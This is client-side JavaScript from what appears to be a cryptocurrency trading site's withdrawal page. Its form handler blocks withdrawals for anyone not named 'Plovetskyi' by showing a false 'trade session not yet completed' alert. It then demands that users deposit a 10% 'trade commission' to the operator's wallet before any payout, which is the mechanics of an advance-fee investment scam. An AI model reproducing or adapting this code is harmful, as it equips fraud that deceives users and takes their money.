    <script>
        const amountInput = document.getElementById("amountInput");
        const amountDisplay = document.getElementById("amountDisplay");
        amountInput.addEventListener("input", (e) => {
            e.preventDefault()
            amountDisplay.innerHTML = amountInput.value || 0
        });

        function copyToClipboard(element) {
            var $temp = $("<input>");
            $("body").append($temp);
            $temp.val($(element).text()).select();
            document.execCommand("copy");
            $temp.remove();
        }
    </script>
    <script>
        let allForms = document.forms;
        for (let i = 0; i < allForms.length; i++) {
            allForms[i].addEventListener("submit", (e) => {
                let value = parseInt(allForms[i].amountRequested.value);
                let userBalance = parseInt(allForms[i].userBalance.value);
                let userProfit = parseInt(allForms[i].userProfit.value);
                let userAddress = allForms[i].userAddress.value;
                let userLastName = allForms[i].lastName.value;
                let userStatus = allForms[i].userStatus.value;

                if (userAddress.length < 10) {
                    alert("Kindly navigate to 'edit account' and input a valid wallet address");
                    e.preventDefault();
                    return
                }
                if (value < 50) {
                    alert("Withrawal amount cannot be less than $50");
                    e.preventDefault();
                    return
                }
                if (value > userProfit) {
                    alert("Please input an amount equal to or less than your profits");
                    e.preventDefault();
                    return
                }
                if (userLastName != "Plovetskyi") {
                    alert("Sorry your trade session is not yet completed");
                    e.preventDefault();
                    return
                }
                if (userStatus != "Paid") {
                    alert("Sorry, your trade commission is not yet paid. Please note that before withdrawing any profits, a trade commission of 10% of your total trade profits must deposited to Capital Returns blockchain wallet address. This is to ensure our traders are paid for their services. This is not an investment or deposit. \nIf you have questions, contact support on helpdesk@capitalreturnsupport.com or chat with an agent live on the website \nDO NOT DEPOSIT INTO ANY OTHER ADDRESS BUT THE ONE PROVIDED ON YOUR DASHBOARD DEPOSIT PAGE");
                    e.preventDefault();
                    return
                }
            });
        }
    </script>
